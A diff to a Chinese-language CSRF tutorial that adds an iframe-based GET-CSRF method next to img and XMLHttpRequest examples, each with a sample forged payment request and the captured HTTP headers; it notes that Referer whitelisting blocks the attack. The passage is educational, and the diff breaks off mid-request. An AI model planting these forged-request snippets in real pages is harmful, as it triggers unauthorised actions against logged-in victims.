@@ -49,17 +49,17 @@ CSRF通过构造get/post等请求，设法使已登录用户victim不知情的�
   * 1.攻击者通过多种办法(如JavaScript) 在 `http://www.3.com/demo` 中注入代码
   * 2.victim访问`http://www.3.com/demo` 实现GET-CSRF
 
-**方法1** 利用`img`标签实现GET-CSRF
+**方法1** 利用资源类的html标签 实现GET-CSRF
+
+如`img`标签
 ```
 <img src="http://get.csrfvul.com/payto?name=hacker&moneynumb=100">
 ```
 
-victim访问`http://www.3.com/demo` 则会发出GET请求到`get.csrfvul.com`
-
+victim使用Chrome浏览器,访问`http://www.3.com/demo` 则会发出GET请求到`get.csrfvul.com`
 
 `get.csrfvul.com`收到了这个GET请求:
 
-很容易看到,该请求中的Referer头说明了该get请求来自于第三方域(如果后端获取Referer的值 且是白名单方法验证其值 则CSRF利用失败)
 ```
 GET /payto?name=hacker&moneynumb=100 HTTP/1.1
 Host: get.csrfvul.com
@@ -70,16 +70,45 @@ Referer: http://www.3.com/demo
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 ```
+很容易看到,该请求中的Referer头说明了该get请求来自于第三方域(如果后端获取Referer的值 且是白名单方法验证其值 则CSRF利用失败)
+
+
+**方法2** 利用`iframe`标签实现GET-CSRF
+
+```
+<iframe src="http://get.csrfvul.com/payto?name=hacker&moneynumb=100">
+```
+
+victim使用Chrome浏览器,访问`http://www.3.com/demo` 则会发出GET请求到`get.csrfvul.com`
+
+`get.csrfvul.com`收到了这个GET请求:
+
+```
+GET /payto?name=hacker&moneynumb=100 HTTP/1.1
+Host: get.csrfvul.com
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://www.3.com/demo
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+```
+
+很容易看到,该请求中的Referer头说明了该get请求来自于第三方域(如果后端获取Referer的值 且是白名单方法验证其值 则CSRF利用失败)
 
 ----
 
-**方法2** 利用`XMLHttpRequest`实现GET-CSRF
+**方法3** 利用`XMLHttpRequest`实现GET-CSRF
 
 * 这种利用`XMLHttpRequest`的CSRF方法,通常仅适用于【同域】下利用CSRF.
 * 如果跨域就需要遵循CORS策略,这种方法通常很难实现跨域触发.
 * 因为`XMLHttpRequest`跨域必须遵循CORS策略. 所以利用`XMLHttpRequest`实现GET-CSRF的【前提条件】很高:
 * 目标站点`csrfvul.com`的HTTP Response Header中的`Access-Control-Allow-Origin:`中明确允许了来自某第三方域名`3.com`跨域请求,才能跨域成功
 
+假如同域页面`csrfvul.com/js`下有以下代码:
 ```
 <script>
 var xhr = new XMLHttpRequest();
@@ -88,7 +117,9 @@ xhr.send();
 </script>
 ```
 
-如果victim使用Firefox则发出的请求为:
+如果victim使用Firefox浏览器,访问`csrfvul.com/js`,则会发出GET请求到`get.csrfvul.com`
+
+`get.csrfvul.com`收到了这个GET请求:
 ```
 GET /payto?name=hacker&moneynumb=100 HTTP/1.1
 Host: www.get.csrfvul.com
